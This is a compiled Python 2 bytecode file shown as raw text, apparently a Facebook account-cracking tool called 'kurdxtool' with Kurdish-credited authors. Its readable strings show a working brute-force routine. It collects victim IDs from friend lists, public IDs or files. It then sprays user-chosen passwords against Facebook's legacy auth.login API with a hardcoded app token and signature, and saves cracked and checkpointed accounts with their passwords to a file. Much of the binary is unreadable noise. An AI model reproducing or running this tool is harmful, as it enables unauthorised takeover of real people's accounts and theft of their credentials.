ó
ÿÿc           @   s6  e  Z e r# d  d  Z   Z n  yÜ d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z Wn8 e k
 r9e j d  e j d  e j d  n Xe e  e j d	  e j   Z e j e   e j e j j   d
 d d g e _ d   Z  d   Z! d   Z" d   Z# d Z$ d  Z% g  Z& g  Z' g  Z( g  a) g  Z* g  Z+ d   Z, d   Z- d   Z. d   Z/ d   Z0 d   Z1 e2 d k r2e,   n  d S(   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   pip2 install requestss   pip2 install mechanizes   python2 kurdxtool.pyt   utf8t   max_timei   s
   User-Agents·   Mozilla/5.0 (Linux; Android 10; STK-L21; HMSCore 5.0.5.300; GMSCore 20.47.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.0.4.302 Mobile Safari/537.36c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   775902368o.pyR      s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   775902368o.pyt   acak#   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   775902368o.pyR   +   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   775902368o.pyt   hamza5   s    s|  
 [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
 [1;91m-----------------------------------------------
 [1;92mâ£ OWNER    : Kurdistan007
 [1;92mâ£ Dev           : BiyarHussein
 [1;92mâ£ Facebook : BiyarHussein
 [1;92mâ£ Telegarm : Biyar007
 [1;91m-----------------------------------------------c          C   s|  t  j d  y t d d  j   }  WnJ t k
 rr t  j d  d GHt  j d  t  j d  t j d  n Xy= t j d |   } t	 j
 | j  } | d	 } | d
 } Wny t k
 rü t  j d  d GHt  j d  t  j d  t j d  n0 t j j k
 r+d GHt j d  t   n Xt  j d  t GHd | GHd | GHd d d GHd GHd GHd GHd GHt   d  S(   Nt   clears	   login.txtt   rs   [!] Token Not Founds   rm -rf login.txts   python2 kurdxtool.pyi   s+   https://graph.facebook.com/me?access_token=t   namet   ids   [!] Account Is On Checkpoints   [!] No Connections   |[â] Name: s   |[â] ID  : t   -i.   s"   [1] Clone With 5 Choice Passwords.s"   [2] Clone With 2 Choice Passwords.s   [0] Back To Main Menu.s                         (   R   t   systemt   opent   readt   IOErrorR   R   t   requestst   gett   jsont   loadst   textt   KeyErrort
   exceptionsR   R   t   bannert
   menu2_menu(   t   tokett   otwt   aR#   R$   (    (    s   775902368o.pyt   menu2P   sD    
		c          C   sº   t  d  }  |  d k r4 d GHt j d  t   n |  d k rJ t   nl |  d k r` t   nV |  d k rª t j d  t d	  t d
  t j d  t j d  n d GHt   d  S(   Ns   
Choose Option >> R	   s   [!] Filled Incorrectly.i   t   1t   2t   0R!   s   Please Wait.s    While Is Returning To Main Menu.s   python2 .fbikurd.pys   [!] Wrong Input.(	   t	   raw_inputR   R   R2   t   choice1t   choice2R   R&   R    (   t   m2m(    (    s   775902368o.pyR2   t   s"    




c           C   s   t  j d  y t d d  j   a Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHd GHd	 GHd
 GHd GHd GHt	   d  S(   NR!   s	   login.txtR"   s   [!] Token invalids   rm -rf login.txti   s   python2 kurdxtool.pys   [1] Crack From Friend List.s   [2] Crack From Any Public ID.s   [3] Crack From File.s   [0] Backs           (
   R   R&   R'   R(   R3   R)   R   R   R1   t   choice1_menu(    (    (    s   775902368o.pyR;      s     c             s5  t  d  }  |  d k r' d GHt   nï|  d k rØ t j d  t GHt  d    t  d   t  d   t  d	   t  d
   d d GHt j d t  } t j	 | j
  } xd| d D] } t j | d  qº Wn>|  d k r!t j d  t GHt  d  } t  d    t  d   t  d   t  d	   t  d
   d d GHt GHyP t j d | d t  } t j	 | j
  } t d | d  t j d  Wn' t k
 rÅd GHt  d  t   n Xd GHt j d | d t  } t j	 | j
  } x| d D] } t j | d  qWnõ |  d k rôt j d  t GHy t  d  } t  d    t  d   t  d   t  d	   t  d
   d d GHx0 t | d  j   D] }	 t j |	 j    q©WWqt k
 rðd GHt  d  t   qXn" |  d k r
t   n d GHt   t t t   }
 t d  |
  t j d  t d!  t j d  t d"  t j d  d d GH      f d#   } t d$  } | j | t  d% GHt d&  t d'  t t t   } t t t   } d( t t t   d) t t t   GHd d GHt  d  t   d  S(*   Ns   
Choose Option >> R	   s   [!] Fill in correctlyR7   R!   s   [1] Input Password  : s   [2] Input Password  : s   [3] Input Password  : s   [4] Input Password  : s   [5] Input Password  : i/   R%   s3   https://graph.facebook.com/me/friends?access_token=t   dataR$   R8   s   [â] Enter ID : s   https://graph.facebook.com/s   ?access_token=s   [â] Account  Name: R#   g      à?s   [!] ID Not Found!s   
Press Enter To Back s   [1;35;40m[âº] Getting IDs...s   /friends?access_token=t   3s   [â] Enter File Path  : R"   s   [!] File Not FoundR9   s   [â] Total Friends: s#   [â] The Process Has Been Started.s    [!] Press CTRL Z To Stop Processc            sH  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } t	 j
 d | d   d  } t j |  } d | k rº d | d	   GHt j |    nd
 | d k r!d | d   GHt d d  } | j | d   d  | j   t j |    nt	 j
 d | d  d  } t j |  } d | k rd | d	  GHt j |   n¹d
 | d k rçd | d  GHt d d  } | j | d  d  | j   t j |   nRt	 j
 d | d  d  } t j |  } d | k rFd | d	  GHt j |   nód
 | d k r­d | d  GHt d d  } | j | d  d  | j   t j |   nt	 j
 d | d  d  } t j |  } d | k rd | d	  GHt j |   n-d
 | d k rsd | d  GHt d d  } | j | d  d  | j   t j |   nÆ t	 j
 d | d  d  } t j |  } d | k rÒd | d	  GHt j |   ng d
 | d k r9d | d  GHt d d  } | j | d  d  | j   t j |   n  Wn n Xd  S(   Nt   saves   https://graph.facebook.com/s   /?access_token=s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens)   [1;96m[[1;96mSuccessful[1;96m][1;96m s    [1;96m|[1;96m s   www.facebook.comt	   error_msgs)   [1;91m[[1;91mCheckpoint[1;91m][1;91m s    [1;91m|[1;91m s   save/checkpoint.txtR5   t   |s   
(   R   t   mkdirt   OSErrorR*   R+   R3   R,   R-   R.   t   urllibt   urlopent   loadt   okst   appendR'   R   t   closet
   checkpoint(   t   argt   userR5   R   R?   t   qt   crt(   t   pass1t   pass2t   pass3t   pass4t   pass5(    s   775902368o.pyt   mainè   s    




i   s5   [1;97m----------------------------------------------s!   [â] Process Has Been Completed.s+   [1;97m[â] Checkpoint IDS Has Been Saved.s)   [â] Total [1;32mOK/[1;97mCP : [1;32ms   /[1;97m(   R:   t   choice_menuR   R&   R1   R*   R+   R3   R,   R-   R.   R$   RK   R    R   R   R/   R;   R'   t	   readlinest   stripR)   R6   R>   R   R   R    t   mapRJ   RM   (   t   c1mR"   R   t   st   idtt   jokt   opR   t   idlistt   linet   ranaRW   t   pt   xxt   xxx(    (   RR   RS   RT   RU   RV   s   775902368o.pyR>      s¦    
		
	



	U

)	
c           C   s   t  j d  y t d d  j   a Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHd GHd	 GHd
 GHd GHd GHt	   d  S(   NR!   s	   login.txtR"   s   [!] Token invalids   rm -rf login.txti   s   python2 kurdxtool.pys   [1] Crack From Friend List.s   [2] Crack From Any Public ID.s   [3] Crack From File.s   [0] Backs           (
   R   R&   R'   R(   R3   R)   R   R   R1   t   choice2_menu(    (    (    s   775902368o.pyR<   J  s     c             s²  t  d  }  |  d k r' d GHt   nu|  d k r« t j d  t GHt  d    t  d   t j d t  } t j	 | j
  } x| d	 D] } t j | d
  q Wnñ|  d k rËt j d  t GHt  d  } t  d    t  d   d d GHyP t j d | d t  } t j	 | j
  } t d | d  t j d  Wn' t k
 rod GHt  d  t   n Xd GHt j d | d t  } t j	 | j
  } x÷ | d	 D] } t j | d
  q­WnÑ |  d k rzt j d  t GHyd t  d  } t  d    t  d   d d GHx0 t | d  j   D] }	 t j |	 j    q/WWqt k
 rvd GHt  d  t   qXn" |  d k rt   n d GHt   t t t   }
 t d |
  t j d  t d  t j d  t d  t j d  d d GH   f d    } t d!  } | j | t  d" GHt d#  t d$  t t t   } t t t   } d% t t t   d& t t t   GHd d GHt  d  t   d  S('   Ns   
Choose Option >> R	   s   [!] Fill in correctlyR7   R!   s   [1] Input Password  : s   [2] Input Password  : s3   https://graph.facebook.com/me/friends?access_token=R?   R$   R8   s   [â] Enter ID : i/   R%   s   https://graph.facebook.com/s   ?access_token=s   [â] Account  Name: R#   g      à?s   [!] ID Not Found!s   
Press Enter To Back s   [1;35;40m[âº] Getting IDs...s   /friends?access_token=R@   s   [â] Enter File Path : R"   s   [!] File Not FoundR9   s   [â] Total Friends: s#   [â] The Process Has Been Started.s!   [!] Press CTRL Z To Stop Process.c            sö  |  } y t  j d  Wn t k
 r* n Xy½t j d | d t  } t j | j  } t	 j
 d | d   d  } t j |  } d | k rº d | d	   GHt j |    n-d
 | d k r!d | d   GHt d d  } | j | d   d  | j   t j |    nÆ t	 j
 d | d  d  } t j |  } d | k rd | d	  GHt j |   ng d
 | d k rçd | d  GHt d d  } | j | d  d  | j   t j |   n  Wn n Xd  S(   NRA   s   https://graph.facebook.com/s   /?access_token=s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RB   s)   [1;96m[[1;96mSuccessful[1;96m][1;96m s    [1;96m|[1;96m s   www.facebook.comRC   s)   [1;91m[[1;91mCheckpoint[1;91m][1;91m s    [1;91m|[1;91m s   save/checkpoint.txtR5   RD   s   
(   R   RE   RF   R*   R+   R3   R,   R-   R.   RG   RH   RI   RJ   RK   R'   R   RL   RM   (   RN   RO   R5   R   R?   RP   RQ   (   RR   RS   (    s   775902368o.pyRW     s@    

i   s5   [1;97m----------------------------------------------s!   [â] Process Has Been Completed.s+   [1;97m[â] Checkpoint IDS Has Been Saved.s)   [â] Total [1;32mOK/[1;97mCP : [1;32ms   /[1;97m(   R:   RX   R   R&   R1   R*   R+   R3   R,   R-   R.   R$   RK   R    R   R   R/   R<   R'   RY   RZ   R)   R6   Rg   R   R   R    R[   RJ   RM   (   t   c2mR"   R   R]   R^   R_   R`   R   Ra   Rb   Rc   RW   Rd   Re   Rf   (    (   RR   RS   s   775902368o.pyRg   ]  s    
	
	



	,

)	
t   __main__(   s
   User-Agents·   Mozilla/5.0 (Linux; Android 10; STK-L21; HMSCore 5.0.5.300; GMSCore 20.47.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.0.4.302 Mobile Safari/537.36(3   t   Falset   foot   barR   R   R   t   datetimeR   t   hashlibt   ret	   threadingR,   RG   t	   cookielibt   getpasst	   mechanizeR*   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   ImportErrorR&   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R1   t   backt   threadst
   successfulRM   RJ   t   idhR$   R6   R2   R;   R>   R<   Rg   t   __name__(    (    (    s   775902368o.pyt   <module>   sL   
¨
			
		$			®		y